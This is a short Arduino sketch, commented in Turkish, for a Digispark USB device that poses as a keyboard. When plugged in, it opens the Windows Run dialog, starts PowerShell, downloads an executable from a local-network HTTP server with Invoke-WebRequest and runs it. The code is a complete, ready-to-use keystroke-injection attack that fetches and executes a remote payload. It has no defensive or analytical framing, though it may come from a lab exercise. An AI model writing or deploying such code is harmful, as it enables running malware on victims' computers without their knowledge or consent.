#define kbd_tr_tr
// klavye düzenini Türkçe (Q klavye) olarak ayarlar. Kodun geri kalanında bu klavye düzeni kullanılacaktır.

#include "DigiKeyboard.h"
// Dijital klavye işlevlerini kullanmak için "DigiKeyboard" kütüphanesini içerir.

void setup() {

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  // Herhangi bir tuşa basılmadığını simgeler. Bu, mevcut tuş vuruşlarının temizlenmesine yardımcı olur.

  DigiKeyboard.delay(500);
  // 500 milisaniye (0.5 saniye) boyunca bir gecikme ekler. İşlemler arasında bekleme süreleri sağlar.

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Windows işletim sisteminde "Windows tuşuna basın + R" kombinasyonunu simgeler. Bu, Çalıştır penceresini açmak için kullanılır.

  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell.exe");
  // "powershell.exe" adlı bir uygulamayı çalıştırmak için yazmaya başlar.

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Enter tuşuna basmayı simgeler ve PowerShell'i başlatır.
   
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Invoke-WebRequest -Uri 'http://192.168.1.95:8000/0123456789.exe' -OutFile '0123456789.exe'");
  // PowerShell komut satırına bir dosyanın indirilmesini sağlayan bir komutu yazmaya başlar. Bu komut, "http://192.168.1.95:8000/0123456789.exe" adresinden dosyayı indirir ve "0123456789.exe" olarak kaydeder.

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("./0123456789.exe");
  // "0123456789.exe" adlı bir programı çalıştırmak için yazmaya başlar.

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
    // Sonsuz bir döngü oluşturur. Bu, kodun sürekli olarak çalışmasını sağlar ve Arduino'nun sürekli olarak bu işlemi yürütmesini sağlar.
  }
}